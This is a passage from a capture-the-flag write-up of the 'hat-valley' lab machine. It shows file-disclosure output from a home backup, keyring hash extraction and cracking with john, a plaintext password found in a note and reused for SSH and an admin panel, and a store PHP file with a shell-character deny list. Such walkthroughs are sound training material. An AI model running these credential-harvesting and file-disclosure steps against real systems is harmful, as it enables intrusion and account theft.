</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$./lfi.sh /home/bean/Documents/backup/bean_backup_final.tar.gz &gt; bean_backup_final.tar.gz
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span> <span class=m>31716</span>  <span class=m>100</span> <span class=m>31716</span>    <span class=m>0</span>     <span class=m>0</span>   339k      <span class=m>0</span> --:--:-- --:--:-- --:--:--  344k
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$tar</span> xzvf bean_backup_final.tar.gz 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>gzip: stdin: unexpected end of file
</span></span><span class=line><span class=cl>./
</span></span><span class=line><span class=cl>./bean_backup.tar.gz
</span></span><span class=line><span class=cl>./time.txt
</span></span><span class=line><span class=cl>tar: Child returned status <span class=m>1</span>
</span></span><span class=line><span class=cl>tar: Error is not recoverable: exiting now
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$tar</span> xzvf bean_backup.tar.gz 
</span></span><span class=line><span class=cl>./
</span></span><span class=line><span class=cl>./Templates/
</span></span><span class=line><span class=cl>./.ssh/
</span></span><span class=line><span class=cl>./Pictures/
</span></span><span class=line><span class=cl>./.config/
</span></span><span class=line><span class=cl>./.config/xpad/
</span></span><span class=line><span class=cl>./.config/xpad/info-GQ1ZS1
</span></span><span class=line><span class=cl>./.config/xpad/default-style
</span></span><span class=line><span class=cl>./.config/xpad/content-DS1ZS1
</span></span><span class=line><span class=cl>./.config/gnome-initial-setup-done
</span></span><span class=line><span class=cl>./.config/goa-1.0/
</span></span><span class=line><span class=cl>./.config/update-notifier/
</span></span><span class=line><span class=cl>./.config/dconf/
</span></span><span class=line><span class=cl>./.config/dconf/user
</span></span><span class=line><span class=cl>./.config/autostart/
</span></span><span class=line><span class=cl>./.config/autostart/xpad.desktop
</span></span><span class=line><span class=cl>./.config/.gsd-keyboard.settings-ported
</span></span><span class=line><span class=cl>./.config/ibus/
</span></span><span class=line><span class=cl>./.config/ibus/bus/
</span></span><span class=line><span class=cl>./.config/ibus/bus/ee6a821b27764b4d9e547b4690827539-unix-wayland-0
</span></span><span class=line><span class=cl>./.config/ibus/bus/ee6a821b27764b4d9e547b4690827539-unix-0
</span></span><span class=line><span class=cl>./.config/gtk-3.0/
</span></span><span class=line><span class=cl>./.config/gtk-3.0/bookmarks
</span></span><span class=line><span class=cl>./.config/pulse/
</span></span><span class=line><span class=cl>./.config/pulse/cookie
</span></span><span class=line><span class=cl>./.config/pulse/ee6a821b27764b4d9e547b4690827539-default-source
</span></span><span class=line><span class=cl>./.config/pulse/ee6a821b27764b4d9e547b4690827539-stream-volumes.tdb
</span></span><span class=line><span class=cl>./.config/pulse/ee6a821b27764b4d9e547b4690827539-card-database.tdb
</span></span><span class=line><span class=cl>./.config/pulse/ee6a821b27764b4d9e547b4690827539-device-volumes.tdb
</span></span><span class=line><span class=cl>./.config/pulse/ee6a821b27764b4d9e547b4690827539-default-sink
</span></span><span class=line><span class=cl>./.config/nautilus/
</span></span><span class=line><span class=cl>./.config/evolution/
</span></span><span class=line><span class=cl>./.config/evolution/sources/
</span></span><span class=line><span class=cl>./.config/evolution/sources/system-proxy.source
</span></span><span class=line><span class=cl>./.config/user-dirs.dirs
</span></span><span class=line><span class=cl>./.config/user-dirs.locale
</span></span><span class=line><span class=cl>./Videos/
</span></span><span class=line><span class=cl>./.gnupg/
</span></span><span class=line><span class=cl>./.gnupg/pubring.kbx
</span></span><span class=line><span class=cl>./.gnupg/trustdb.gpg
</span></span><span class=line><span class=cl>./.local/
</span></span><span class=line><span class=cl>./.local/share/
</span></span><span class=line><span class=cl>./.local/share/keyrings/
</span></span><span class=line><span class=cl>./.local/share/keyrings/login.keyring
</span></span><span class=line><span class=cl>./.local/share/keyrings/user.keystore
</span></span><span class=line><span class=cl>./.local/share/icc/
</span></span><span class=line><span class=cl>./.local/share/applications/
</span></span><span class=line><span class=cl>./.local/share/gnome-settings-daemon/
</span></span><span class=line><span class=cl>./.local/share/gnome-settings-daemon/input-sources-converted
</span></span><span class=line><span class=cl>./.local/share/gnome-shell/
</span></span><span class=line><span class=cl>./.local/share/gnome-shell/application_state
</span></span><span class=line><span class=cl>./.local/share/gnome-shell/gnome-overrides-migrated
</span></span><span class=line><span class=cl>./.local/share/recently-used.xbel
</span></span><span class=line><span class=cl>./.local/share/nautilus/
</span></span><span class=line><span class=cl>./.local/share/nautilus/tracker2-migration-complete
</span></span><span class=line><span class=cl>./.local/share/nautilus/tags/
</span></span><span class=line><span class=cl>./.local/share/nautilus/tags/meta.db-shm
</span></span><span class=line><span class=cl>./.local/share/nautilus/tags/meta.db-wal
</span></span><span class=line><span class=cl>./.local/share/nautilus/tags/.meta.isrunning
</span></span><span class=line><span class=cl>./.local/share/nautilus/tags/meta.db
</span></span><span class=line><span class=cl>./.local/share/nautilus/tags/ontologies.gvdb
</span></span><span class=line><span class=cl>./.local/share/evolution/
</span></span><span class=line><span class=cl>./.local/share/evolution/memos/
</span></span><span class=line><span class=cl>./.local/share/evolution/memos/trash/
</span></span><span class=line><span class=cl>./.local/share/evolution/addressbook/
</span></span><span class=line><span class=cl>./.local/share/evolution/addressbook/system/
</span></span><span class=line><span class=cl>./.local/share/evolution/addressbook/system/contacts.db
</span></span><span class=line><span class=cl>./.local/share/evolution/addressbook/system/photos/
</span></span><span class=line><span class=cl>./.local/share/evolution/addressbook/trash/
</span></span><span class=line><span class=cl>./.local/share/evolution/tasks/
</span></span><span class=line><span class=cl>./.local/share/evolution/tasks/system/
</span></span><span class=line><span class=cl>./.local/share/evolution/tasks/system/tasks.ics
</span></span><span class=line><span class=cl>./.local/share/evolution/tasks/trash/
</span></span><span class=line><span class=cl>./.local/share/evolution/calendar/
</span></span><span class=line><span class=cl>./.local/share/evolution/calendar/system/
</span></span><span class=line><span class=cl>./.local/share/evolution/calendar/trash/
</span></span><span class=line><span class=cl>./.local/share/evolution/mail/
</span></span><span class=line><span class=cl>./.local/share/evolution/mail/trash/
</span></span><span class=line><span class=cl>./.local/share/sounds/
</span></span><span class=line><span class=cl>./.local/share/flatpak/
</span></span><span class=line><span class=cl>./.local/share/flatpak/db/
</span></span><span class=line><span class=cl>./.local/share/ibus-table/
</span></span><span class=line><span class=cl>./.local/share/gvfs-metadata/
</span></span><span class=line><span class=cl>./.local/share/gvfs-metadata/home
</span></span><span class=line><span class=cl>./.local/share/gvfs-metadata/home-41546c5f.log
</span></span><span class=line><span class=cl>./.local/share/gvfs-metadata/root-46f3d4c6.log
</span></span><span class=line><span class=cl>./.local/share/gvfs-metadata/root
</span></span><span class=line><span class=cl>./.local/share/nano/
</span></span><span class=line><span class=cl>./.local/share/session_migration-ubuntu
</span></span><span class=line><span class=cl>./Music/
</span></span><span class=line><span class=cl>./snap/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/current
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/Templates/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.themes
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/Pictures/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/dconf/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/dconf/user
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/fontconfig/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/fontconfig/fonts.conf
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/user-dirs.locale.md5sum
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/ibus/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/ibus/bus
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/gtk-2.0/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/gtk-2.0/gtkfilechooser.ini
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/gtk-3.0/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/gtk-3.0/settings.ini
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/gtk-3.0/bookmarks
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/user-dirs.dirs.md5sum
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/user-dirs.dirs
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.config/user-dirs.locale
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/Videos/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.last_revision
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.local/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.local/share/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.local/share/themes
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.local/share/icons/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.local/share/glib-2.0/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/.local/share/glib-2.0/schemas/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/Music/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/Downloads/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/Desktop/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/Public/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/14/Documents/
</span></span><span class=line><span class=cl>./snap/snapd-desktop-integration/common/
</span></span><span class=line><span class=cl>./.bashrc
</span></span><span class=line><span class=cl>./Downloads/
</span></span><span class=line><span class=cl>./.bash_history
</span></span><span class=line><span class=cl>./.profile
</span></span><span class=line><span class=cl>./Desktop/
</span></span><span class=line><span class=cl>./Public/
</span></span><span class=line><span class=cl>./.bash_logout
</span></span><span class=line><span class=cl>./Documents/
</span></span><span class=line><span class=cl>./Documents/backup_tmp/
</span></span><span class=line><span class=cl>./Documents/backup_tmp/bean_backup.tar.gz
</span></span><span class=line><span class=cl>./Documents/backup_home.sh
</span></span><span class=line><span class=cl>./Documents/backup/
</span></span></code></pre></td></tr></table></div></div><p>The gnome keyring files above look interesting &ndash; and according to <a href=https://steflan-security.com/linux-privilege-escalation-credentials-harvesting/ target=_blank rel="noopener noreffer">Linux Privilege Escalation – Credentials Harvesting - StefLan's Security Blog</a>, we can extract hashes out for john the ripper to brute force:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>zara@supernova<span class=o>]</span>─<span class=o>[</span>~/hat-valley/download/.local/share/keyrings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$ls</span> -la
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>drwx------ <span class=m>1</span> zara zara  <span class=m>52</span> Sep <span class=m>15</span> 21:35 .
</span></span><span class=line><span class=cl>drwx------ <span class=m>1</span> zara zara <span class=m>308</span> Sep <span class=m>15</span> 21:43 ..
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> zara zara <span class=m>105</span> Sep <span class=m>15</span> 21:35 login.keyring
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> zara zara <span class=m>207</span> Sep <span class=m>15</span> 21:35 user.keystore
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$python2</span> /usr/share/john/keyring2john.py login.keyring &gt; ~/hat-valley/keyring_hash.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$john</span> --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt ~/hat-valley/keyring_hash.txt
</span></span></code></pre></td></tr></table></div></div><p>I let john the ripper run using <code>rockyou.txt</code> as my wordlist, and I tried some wordlists from <a href=https://github.com/danielmiessler/SecLists target=_blank rel="noopener noreffer">SecLists</a>, but wasn&rsquo;t able to brute force the hash.</p><p>If we grep all files for the username <code>bean</code> (ignoring our lfi.sh script):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$grep</span> -irn bean
</span></span><span class=line><span class=cl>lfi.sh:8:JWT<span class=o>=</span><span class=k>$(</span>jwt encode --secret 123beany123 <span class=s2>&#34;</span><span class=nv>$JSON_PAYLOAD</span><span class=s2>&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>.config/xpad/content-DS1ZS1:9:bean.hill
</span></span><span class=line><span class=cl>.config/xpad/content-DS1ZS1:10:014mrbeanrules!#P
</span></span></code></pre></td></tr></table></div></div><p>This looks like a set of credentials in an xpad note.. maybe? Let&rsquo;s try it as an SSH password:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> <span class=nv>$ssh</span> bean@hat-valley.htb
</span></span><span class=line><span class=cl>bean@hat-valley.htb<span class=err>&#39;</span>s password: 
</span></span><span class=line><span class=cl>Welcome to Ubuntu 22.04.1 LTS <span class=o>(</span>GNU/Linux 5.15.0-52-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>0</span> updates can be applied immediately.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The list of available updates is more than a week old.
</span></span><span class=line><span class=cl>To check <span class=k>for</span> new updates run: sudo apt update
</span></span><span class=line><span class=cl>Last login: Sat Feb  <span class=m>4</span> 08:13:10 <span class=m>2023</span> from 10.10.14.77
</span></span><span class=line><span class=cl>bean@awkward:~$ 
</span></span><span class=line><span class=cl> bean@awkward:~$ cat user.txt 
</span></span><span class=line><span class=cl>5662762c28a1c7b3cc16035d5bfd82ee
</span></span></code></pre></td></tr></table></div></div><p>Yep! So we have user / password combination bean / 014mrbeanrules!#P , and we get the user flag!</p><h2 id=privilege-escalation>Privilege Escalation</h2><p>Looking at the output of <code>ps auxfe</code>, the main thing that stands out is nginx running as root, with two worker processes running as www-data:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root        <span class=m>1370</span>  0.0  0.0  <span class=m>55196</span>  <span class=m>1764</span> ?        Ss   Feb03   0:00 nginx: master process /usr/sbin/nginx -g daemon on<span class=p>;</span> master_process on<span class=p>;</span>
</span></span><span class=line><span class=cl>www-data    <span class=m>1372</span>  0.1  0.1  <span class=m>56468</span>  <span class=m>7120</span> ?        S    Feb03   2:04  <span class=se>\_</span> nginx: worker process
</span></span><span class=line><span class=cl>www-data    <span class=m>1373</span>  0.0  0.1  <span class=m>56344</span>  <span class=m>6720</span> ?        S    Feb03   1:05  <span class=se>\_</span> nginx: worker process
</span></span></code></pre></td></tr></table></div></div><p>As user bean, I cannot run anything as sudo. I found the following user/hash for HTTP basic auth in nginx. Initial attempts to brute force failed here:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bean@awkward:/etc/nginx/conf.d$ cat .htpasswd 
</span></span><span class=line><span class=cl>admin:<span class=nv>$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1</span>
</span></span></code></pre></td></tr></table></div></div><p>Browsing to <a href=http://store.hat-valley.htb/ target=_blank rel="noopener noreffer">http://store.hat-valley.htb/</a>, I tried admin / 014mrbeanrules!#P - which works:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-04-19-50-18-image.png data-srcset="./assets/2023-02-04-19-50-18-image.png, ./assets/2023-02-04-19-50-18-image.png 1.5x, ./assets/2023-02-04-19-50-18-image.png 2x" data-sizes=auto alt=./assets/2023-02-04-19-50-18-image.png title=./assets/2023-02-04-19-50-18-image.png></p><p>It&rsquo;s here I started looking for dynamic behaviour. And while we can&rsquo;t check out, we can add items to cart, and then remove them once in the cart:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-04-20-01-14-image.png data-srcset="./assets/2023-02-04-20-01-14-image.png, ./assets/2023-02-04-20-01-14-image.png 1.5x, ./assets/2023-02-04-20-01-14-image.png 2x" data-sizes=auto alt=./assets/2023-02-04-20-01-14-image.png title=./assets/2023-02-04-20-01-14-image.png></p><p>Adding item to cart:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /cart_actions.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: store.hat-valley.htb
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Referer: http://store.hat-valley.htb/shop.php
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded; charset=UTF-8
</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
</span></span><span class=line><span class=cl>Content-Length: 46
</span></span><span class=line><span class=cl>Origin: http://store.hat-valley.htb
</span></span><span class=line><span class=cl>DNT: 1
</span></span><span class=line><span class=cl>Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>item=1&amp;user=59ab-bdec-f4c-c29c&amp;action=add_item
</span></span></code></pre></td></tr></table></div></div><p>We also have access to the server PHP in <code>/var/www/store</code> and can see cart_actions.php to ascertain the behaviour and find any vulnerabilities:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bean@awkward:/var/www/store$ cat cart_actions.php 
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$STORE_HOME</span> <span class=o>=</span> <span class=s2>&#34;/var/www/store/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>//check <span class=k>for</span> valid hat valley store item
</span></span><span class=line><span class=cl><span class=k>function</span> checkValidItem<span class=o>(</span><span class=nv>$filename</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=o>(</span>file_exists<span class=o>(</span><span class=nv>$filename</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$first_line</span> <span class=o>=</span> file<span class=o>(</span><span class=nv>$filename</span><span class=o>)[</span>0<span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=o>(</span>strpos<span class=o>(</span><span class=nv>$first_line</span>, <span class=s2>&#34;***Hat Valley&#34;</span><span class=o>)</span> !<span class=o>==</span> FALSE<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> true<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> false<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>//add to cart
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=nv>$_SERVER</span><span class=o>[</span><span class=s1>&#39;REQUEST_METHOD&#39;</span><span class=o>]</span> <span class=o>===</span> <span class=s1>&#39;POST&#39;</span> <span class=o>&amp;&amp;</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;action&#39;</span><span class=o>]</span> <span class=o>===</span> <span class=s1>&#39;add_item&#39;</span> <span class=o>&amp;&amp;</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;item&#39;</span><span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;user&#39;</span><span class=o>])</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$item_id</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;item&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$user_id</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;user&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$bad_chars</span> <span class=o>=</span> array<span class=o>(</span><span class=s2>&#34;;&#34;</span>,<span class=s2>&#34;&amp;&#34;</span>,<span class=s2>&#34;|&#34;</span>,<span class=s2>&#34;&gt;&#34;</span>,<span class=s2>&#34;&lt;&#34;</span>,<span class=s2>&#34;*&#34;</span>,<span class=s2>&#34;?&#34;</span>,<span class=s2>&#34;`&#34;</span>,<span class=s2>&#34;</span>$<span class=s2>&#34;</span>,<span class=s2>&#34;(&#34;</span>,<span class=s2>&#34;)&#34;</span>,<span class=s2>&#34;{&#34;</span>,<span class=s2>&#34;}&#34;</span>,<span class=s2>&#34;[&#34;</span>,<span class=s2>&#34;]&#34;</span>,<span class=s2>&#34;!&#34;</span>,<span class=s2>&#34;#&#34;</span><span class=o>)</span><span class=p>;</span> //no hacking allowed!!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    foreach<span class=o>(</span><span class=nv>$bad_chars</span> as <span class=nv>$bad</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=o>(</span>strpos<span class=o>(</span><span class=nv>$item_id</span>, <span class=nv>$bad</span><span class=o>)</span> !<span class=o>==</span> FALSE<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=nb>echo</span> <span class=s2>&#34;Bad character detected!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            exit<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    foreach<span class=o>(</span><span class=nv>$bad_chars</span> as <span class=nv>$bad</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=o>(</span>strpos<span class=o>(</span><span class=nv>$user_id</span>, <span class=nv>$bad</span><span class=o>)</span> !<span class=o>==</span> FALSE<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=nb>echo</span> <span class=s2>&#34;Bad character detected!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            exit<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=o>(</span>checkValidItem<span class=o>(</span><span class=s2>&#34;{</span><span class=nv>$STORE_HOME</span><span class=s2>}product-details/{</span><span class=nv>$item_id</span><span class=s2>}.txt&#34;</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=o>(</span>!file_exists<span class=o>(</span><span class=s2>&#34;{</span><span class=nv>$STORE_HOME</span><span class=s2>}cart/{</span><span class=nv>$user_id</span><span class=s2>}&#34;</span><span class=o>))</span> <span class=o>{</span>
